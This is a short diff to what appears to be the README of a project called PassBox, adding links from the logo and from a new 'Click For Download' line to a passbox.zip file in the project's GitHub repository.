@@ -148,7 +148,7 @@ http://localhost:5000
 
 🎞️ Logo
 -------------------------
-<a href="">
+<a href="https://github.com/Francesco-Ferrillo/PassBox/blob/main/passbox.zip">
 <img src="Logo.png" alt="PassBox_Logo" width="200">
 </a>
 
@@ -163,3 +163,6 @@ http://localhost:5000
 </a>
 
 # 🌐 Web Application
+<a href="https://github.com/Francesco-Ferrillo/PassBox/blob/main/passbox.zip">
+  <p>Click For Download PassBox 📥<p>
+</a>
